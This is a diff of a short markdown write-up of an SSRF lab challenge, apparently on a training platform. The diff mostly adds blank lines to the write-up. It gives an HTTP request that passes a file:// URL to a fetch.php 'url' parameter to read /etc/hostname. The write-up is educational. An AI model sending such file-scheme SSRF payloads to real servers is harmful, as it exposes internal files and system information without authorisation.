@@ -1,9 +1,11 @@
 # Basic SSRF - improved-wolfpack.apac01.hackviser.space
 
 ## 🎯 Objective
+
 Exploit a Server-Side Request Forgery vulnerability to read internal system files and gather server information.
 
 ## 🔍 Vulnerability Analysis
+
 - **Type:** Server-Side Request Forgery (SSRF)
 - **Endpoint:** `GET /fetch.php`
 - **Parameter:** `url`
@@ -11,6 +13,7 @@ Exploit a Server-Side Request Forgery vulnerability to read internal system file
 - **Impact:** Internal file disclosure and service enumeration
 
 ## 💥 Exploitation
+
 ```http
 GET /fetch.php?url=file:///etc/hostname HTTP/1.1
 Host: improved-wolfpack.apac01.hackviser.space
@@ -35,3 +38,4 @@ Impact Assessment: Understanding data exposure risks from internal file access
 Bypass Techniques: Leveraging different URL schemes for SSRF exploitation
 
 Conducted in controlled environment for educational purposes
+```
